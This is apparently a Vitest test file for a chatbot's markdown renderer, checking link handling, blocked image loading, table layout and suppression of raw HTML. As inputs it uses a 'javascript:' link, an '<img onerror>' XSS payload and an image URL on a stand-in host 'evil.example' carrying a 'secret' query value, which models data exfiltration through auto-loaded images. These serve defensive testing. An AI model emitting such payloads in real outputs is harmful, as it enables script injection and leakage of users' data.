import { it, expect, describe } from 'vitest';
import { render, screen } from '@testing-library/react';

import { createTheme, ThemeProvider } from '@mui/material/styles';

import ChatbotMarkdown from 'src/components/chatbot/chatbot-markdown';

// ----------------------------------------------------------------------
// Markdown của câu trả lời: link an toàn + mở tab mới, ảnh markdown không tự tải, bảng nằm trong hộp
// cuộn ngang riêng (ô ngắn không xuống dòng, ô dài tự xuống dòng), khối máy ```spark bị cắt.
// ----------------------------------------------------------------------

function renderMarkdown(text: string) {
  return render(
    <ThemeProvider theme={createTheme()}>
      <ChatbotMarkdown text={text} />
    </ThemeProvider>
  );
}

describe('ChatbotMarkdown', () => {
  it('link http(s) mở tab mới với noopener noreferrer; scheme khác chỉ hiện chữ', () => {
    renderMarkdown(
      [
        '[Báo cáo](https://example.com/bao-cao)',
        '[Gọi](tel:0900000001)',
        '[Xấu](javascript:alert(1))',
        '[Trang trong app](/dashboard/pos/sale)',
        'https://example.com/tu-dong',
      ].join('\n\n')
    );

    const link = screen.getByRole('link', { name: 'Báo cáo' });
    expect(link).toHaveAttribute('href', 'https://example.com/bao-cao');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');

    // URL trần được remark-gfm tự nhận thành link.
    expect(screen.getByRole('link', { name: 'https://example.com/tu-dong' })).toHaveAttribute(
      'target',
      '_blank'
    );

    expect(screen.getByText('Gọi').closest('a')).toBeNull();
    expect(screen.getByText('Xấu').closest('a')).toBeNull();
    expect(screen.getByText('Trang trong app').closest('a')).toBeNull();
    expect(screen.getAllByRole('link')).toHaveLength(2);
  });

  it('ảnh markdown không tự tải — hiện thành link', () => {
    const { container } = renderMarkdown(
      '![Kẹp tóc](https://evil.example/pixel.png?d=bi-mat) và ![](https://example.com/a.png)'
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: 'Kẹp tóc' })).toHaveAttribute(
      'href',
      'https://evil.example/pixel.png?d=bi-mat'
    );
    expect(screen.getByRole('link', { name: 'Xem ảnh' })).toHaveAttribute('target', '_blank');
  });

  it('bảng nằm trong hộp cuộn ngang riêng; chỉ ô chữ dài mới được bọc để xuống dòng', () => {
    const { container } = renderMarkdown(
      [
        '| Ngày | Doanh thu | Ghi chú |',
        '|---|---:|---|',
        '| Thứ 7 (04/10) | 10.940.000 ₫ | Cao nhất tuần, có chương trình giảm giá cuối tuần |',
      ].join('\n')
    );

    const table = container.querySelector('table');
    expect(table).not.toBeNull();
    expect(table?.parentElement).toHaveClass('chatbot-md-table');

    const cells = Array.from(container.querySelectorAll('td'));
    expect(cells).toHaveLength(3);
    expect(cells[0].querySelector('.chatbot-md-long-cell')).toBeNull();
    expect(cells[1].querySelector('.chatbot-md-long-cell')).toBeNull();
    expect(cells[2].querySelector('.chatbot-md-long-cell')).toHaveTextContent(
      'Cao nhất tuần, có chương trình giảm giá cuối tuần'
    );
  });

  it('khối máy ```spark (kể cả chưa đóng khi đang stream) không hiện ra', () => {
    renderMarkdown('Doanh thu hôm nay 5 triệu.\n```spark-ui\n{"blocks":[{"type":"action"');

    expect(screen.getByText('Doanh thu hôm nay 5 triệu.')).toBeInTheDocument();
    expect(screen.queryByText(/blocks/)).toBeNull();
  });

  it('HTML thô trong câu trả lời không được dựng thành thẻ', () => {
    const { container } = renderMarkdown('Xin chào <img src=x onerror=alert(1)> <b>đậm</b>');

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
  });
});
